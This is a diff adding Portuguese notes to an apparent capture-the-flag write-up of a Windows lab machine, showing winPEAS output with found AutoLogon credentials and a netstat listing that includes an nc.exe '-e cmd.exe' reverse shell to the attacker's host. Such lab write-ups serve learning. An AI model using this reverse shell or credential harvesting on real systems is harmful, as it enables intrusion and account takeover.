@@ -1286,3 +1286,40 @@ Exploit: https://www.exploit-db.com/exploits/46156/
 
 [+] Done. Displaying 113 of the 4051 vulnerabilities found.
 ```
+
+Resolvi enumerar um pouco mais, dessa vez usanso o winPEAS.
+
+Tranferir usando o SMBSERVER
+
+Encontramos a senha de um usuario, vou tentar executar comando usando o administrator com a senha encontrada do usuario.
+
+```
+[+] Looking for AutoLogon credentials(T1012)                                                                                                                             
+    Some AutoLogon credentials were found!!                                                                                                                                
+    DefaultUserName               :  kostas                                                                                                                                
+    DefaultPassword               :  kdeEjDowkS*    
+```
+
+Encontrei mais informacoes interessantes
+
+```
+=== Active TCP Network Connections ===    
+                                          
+  Local Address          Foreign Address        State      PID   Service         ProcessName
+  0.0.0.0:80             0.0.0.0:0              LISTEN     2620                  "C:\Users\kostas\Desktop\hfs.exe" 
+  0.0.0.0:135            0.0.0.0:0              LISTEN     576   RpcSs           svchost.exe
+  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:49152          0.0.0.0:0              LISTEN     384                   wininit.exe
+  0.0.0.0:49153          0.0.0.0:0              LISTEN     676   EventLog        svchost.exe
+  0.0.0.0:49154          0.0.0.0:0              LISTEN     728   Schedule        svchost.exe
+  0.0.0.0:49155          0.0.0.0:0              LISTEN     528   Spooler         spoolsv.exe
+  0.0.0.0:49156          0.0.0.0:0              LISTEN     480                   services.exe
+  0.0.0.0:49157          0.0.0.0:0              LISTEN     488                   lsass.exe
+  10.10.10.8:139         0.0.0.0:0              LISTEN     4                     System                                                                                    
+  10.10.10.8:49174       10.10.14.36:443        CLOSE_WAIT 2380                  
+  10.10.10.8:49179       10.10.14.36:443        ESTAB      2184                  "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.36 443
+
+```
+    
